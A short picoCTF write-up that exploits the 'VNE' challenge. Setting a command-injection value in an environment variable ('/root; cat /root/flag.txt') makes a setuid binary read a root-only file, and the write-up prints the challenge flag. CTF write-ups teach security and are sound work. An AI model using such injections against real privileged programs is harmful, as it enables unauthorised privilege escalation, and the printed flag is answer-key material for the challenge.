---
title: "VNE"
date: "2025-07-15"
tags: ["picoCTF", "env"]
---

This challenge gives us the credentials to log in over SSH as a user on a machine.

In the home directory I find a binary called `bin`:

```bash
file bin  
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
```

If I try to run it, I get an error message:

```bash
./bin
Error: SECRET_DIR environment variable is not set
```

If I set the `SECRET_DIR` variable to the `/root` directory, for example, running the binary shows an `ls` of the contents of `/root`:

```bash
export SECRET_DIR="/root"
./bin
Listing the content of /root as root:
flag.txt
```

I can see the `flag.txt` file, but not its content.

I can run `strings` on the binary to get more information. Doing that, I spot this line:

```bash
__stack_chk_fail
__cxa_atexit
getenv
system // Ruta relativa
__cxa_finalize
setgid
__libc_start_main
```

The binary seems to use `system` with a relative path. Looking at how it behaves, I can guess it is running something like `system('ls SECRET_DIR')`.

I can try to inject a second command using `;` like this:

```bash
export SECRET_DIR='/root; cat /root/flag.txt'
```

I run the binary:

```bash
./bin
Listing the content of /root; cat /root/flag.txt as root:
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_cdeb2a4d}
```

Got it!
